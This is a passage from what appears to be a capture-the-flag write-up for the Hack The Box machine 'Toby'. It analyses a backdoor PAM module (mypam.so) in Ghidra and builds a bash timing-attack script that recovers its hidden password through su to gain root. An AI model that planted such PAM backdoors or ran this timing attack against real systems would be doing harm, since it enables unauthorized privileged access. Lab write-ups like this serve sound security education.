$ diff common-account ~/hackthebox/toby-10.10.10.140/pam.d/common-account 
17c17
< account	[success=1 new_authtok_reqd=done default=ignore]	pam_unix.so 
---
> account	[success=1 new_authtok_reqd=done default=ignore]	pam_unix.so nodelay
19c19
< account	requisite			pam_deny.so
---
> account	requisite			pam_deny.so nodelay
23c23
< account	required			pam_permit.so
---
> account	required			pam_permit.so nodelay

```

`common-auth` had similar additions of `nodelay`:

```

$ diff common-auth ~/hackthebox/toby-10.10.10.140/pam.d/common-auth 
1c1,3
< #
---
> 
> auth sufficient mypam.so nodelay
> account sufficient mypam.so nodelay
17c19
< auth	[success=1 default=ignore]	pam_unix.so nullok_secure
---
> auth	[success=1 default=ignore]	pam_unix.so nullok_secure nodelay
19c21
< auth	requisite			pam_deny.so
---
> auth	requisite			pam_deny.so nodelay
23c25
< auth	required			pam_permit.so
---
> auth	required			pam_permit.so nodelay
25c27
< auth	optional			pam_cap.so 
---
> auth	optional			pam_cap.so nodelay

```

I suspect this could be the admin trying to address the “slow logins”, by setting the default failure time from three seconds to zero. That same difference is in the rest of the files.

But there’s another addition right at the top of `common-auth` (these lines are not in my local instance):

```

auth sufficient mypam.so nodelay
account sufficient mypam.so nodelay

```

It’s loading a custom PAM module, `mypam.so`. `find` locates it:

```

jack@toby:/$ find / -name mypam.so -ls 2>/dev/null
   400692    236 -rwxr-xr-x   1 root     root       240616 Jul 14 11:10 /usr/lib/x86_64-linux-gnu/security/mypam.so

```

If this module is adding one second of time, that would explain both why the logins felt slower and why it still hangs for one second with the delay set to zero.

I’ll pull this module back to my VM with `scp -i ~/keys/toby-jack jack@toby.htb:/usr/lib/x86_64-linux-gnu/security/mypam.so .`.

### mypam.so

I’ll open the module in Ghidra and take a look. There’s a handful of functions that start with `pam_sm_`. The [man page](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html) shows that `pam_sm_authenticate` is the function called to get a password and check it, so I’ll start there.

![image-20220414101957096](https://0xdfimages.gitlab.io/img/image-20220414101957096.png)

At line 43 in the Ghidra disassembly there’s a call to `pam_get_authtok` ([man page](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)), which is what prompts the user for a password, and it stores the result in a variable I’ve named `input_pass`.

```

res = pam_get_authtok(pamh,6,&input_pass);

```

At line 56 it enters a `do` / `while` loop. At line 57, it opens `/etc/.bd` and uses `fscanf` to read up until a newline character (using the `[` [modifier](https://pubs.opengroup.org/onlinepubs/000095399/functions/fscanf.html)), and save it into a variable I’ve named `file_pass`:

```

      do {
        __stream = fopen("/etc/.bd","r");
        if (__stream == (FILE *)0x0) goto LAB_001048ff;
        __isoc99_fscanf(__stream,"%[^\n]",file_pass);
        fclose(__stream);

```

It is poor coding that it’s opening the file and re-reading the contents on each loop, rather than once outside the loop. On line 63 is compares byte `i` for `input_pass` and `file_pass`, and basically exits if they don’t match by passing to the default behavior:

```

        if (input_pass[i] != *(char *)((long)file_pass + i)) {
LAB_001049d0:
          res = _unix_verify_password(pamh,name,p,ctrl);
          *piVar2 = res;
          goto LAB_00104990;
        }

```

At the very end of the loop on line 87, there’s a `usleep(100000)`, which will sleep for 0.1 second. It’s worth noting that it only reaches this point if the character was correct.

The while loop runs while `i != 10`, so that implies a hardcoded length of the password.

`/etc/.bd` is on Toby, and only readable by root:

```

jack@toby:/etc$ ls -l .bd
-r-------- 1 root root 10 Jul 14 13:39 .bd

```

It also has 10 bytes.

### Brute Force

#### POC

The theory here is that it will take 0.1 seconds longer for each character that’s right starting at the start of the password. I can test this will a quick Bash loop. First, to test, I’ll `echo` the password and pipe that into `time su`:

```

jack@toby:/etc$ echo "a---------" | time su 
Password: su: Authentication failure
Command exited with non-zero status 1
0.01user 0.00system 0:01.01elapsed 1%CPU (0avgtext+0avgdata 3736maxresident)k
0inputs+8outputs (0major+278minor)pagefaults 0swaps

```

On the second to last line there’s a `0:01.01elapsed`. That’s the time I’m looking for. That output goes to `stderr` so I’ll redirect it to `stdout` (`2>&1`) and then `grep`:

```

jack@toby:/etc$ echo "a---------" | time su 2>&1 | grep elapsed
0.01user 0.00system 0:01.01elapsed 1%CPU (0avgtext+0avgdata 3768maxresident)k

```

I can use a simple regex to match on the time as well and then `-o` to make it a bit prettier:

```

jack@toby:/etc$ echo "a---------" | time su 2>&1 | grep -Eo '.:..\...elapsed'
0:01.01elapsed

```

I’ll use Python to get the printable characters and start building my loop. To start, I’ll just look at the output of the first 10:

```

python3 -c 'import string; print("\n".join(string.printable[:10]))' 
| while read c; do 
    echo -en "$c "; 
    echo "${c}---------" 
    | time su 2>&1 
    | grep -Eo '.:..\...elapsed'; 
done

```

Running this shows that the standard wrong character is around 1.01 or 1.02 seconds:

```

jack@toby:/etc$ python3 -c 'import string; print("\n".join(string.printable[:10]))' | while read c; do echo -en "$c "; echo "${c}---------" | time su 2>&1 | grep -Eo '.:..\...elapsed'; done
0 0:01.01elapsed
1 0:01.02elapsed
2 0:01.01elapsed
3 0:01.01elapsed
4 0:01.02elapsed
5 0:01.01elapsed
6 0:01.01elapsed
7 0:01.01elapsed
8 0:01.01elapsed
9 0:01.01elapsed

```

I’ll use another `grep` to remove lines with “0:01.0” from the results. I’ll also use a `\r` character on the first `echo` so that if nothing is found, it prints over the previous character, which allows me to watch as the checks progress without flooding the terminal. Finally, I’ll add a break if something is printed:

```

python3 -c 'import string; print("\n".join(string.printable[:-5]))' 
| while read c; do 
    echo -en "\r$c "; 
    echo "${c}---------" 
    | time su 2>&1 
    | grep -Eo '.:..\...elapsed' 
    | grep -v "0:01.0" && break; 
done

```

This works, and finds the first character of the password:

```

jack@toby:/etc$ python3 -c 'import string; print("\n".join(string.printable[:-5]))' | while read c; do echo -en "\r$c "; echo "${c}---------" | time su 2>&1 | grep -Eo '.:..\...elapsed' | grep -v "0:01.0" && break; done
T 0:01.11elapsed

```

Here’s how it looks (starting midway into the run):

![brute poc](https://0xdfimages.gitlab.io/img/toby-brute-poc.gif)

#### Full Script

At this point, I am going to leave this bash one liner in favor of a bash script. I have to make the following updates:
- I know the password is ten characters, so I’ll wrap what I have in a loop over 0-9. It also takes 0.1 seconds longer per correct character, so I’ll use that `i` variable to update the `grep`.
- To print the password plus padding to get to 10 characters I’ll use `printf` instead of `echo`.
- I also want to keep a variable with the correct password. I have to get rid of piping into `while read`, as that [runs in a subshell](https://unix.stackexchange.com/questions/402750/modify-global-variable-in-while-loop), which means changes I make to the variable aren’t saved. A slight change in how I feed into the `while` fixes that.
- I’ll update the password on each loop.

The resulting script is:

```

#!/bin/bash

correct=""
for i in {0..9}; do
    while read c; do   
        pass="${correct}${c}"
        echo -en "\r${pass} ";     
        printf "%-10s\n" $pass \
        | time su 2>&1 \
        | grep -Eo '.:..\...elapsed' \
        | grep -v "0:01.${i}" \
        && correct="${pass}" \
        && break;
       done <<<$(python3 -c 'import string; print("\n".join(string.printable[:-5]))')
done

```

It takes about seven minutes to run, but produces a password:

```

jack@toby:/tmp$ time bash brute.sh 
T 0:01.11elapsed
Ti 0:01.21elapsed
Tih 0:01.32elapsed
TihP 0:01.41elapsed
TihPA 0:01.51elapsed
TihPAQ 0:01.61elapsed
TihPAQ4 0:01.71elapsed
TihPAQ4p 0:01.81elapsed
TihPAQ4ps 0:01.92elapsed
TihPAQ4pse 0:01.00elapsed

real    7m17.345s
user    0m6.058s
sys     0m1.430s

```

When it’s running, it looks like:

![brute full](https://0xdfimages.gitlab.io/img/toby-brute-full.gif)

### su

That password works with `su`:

```

jack@toby:/tmp$ su -
Password: 
root@toby:~# 

```

And I can get `root.txt`:

```

root@toby:~# cat root.txt
c640c117************************

```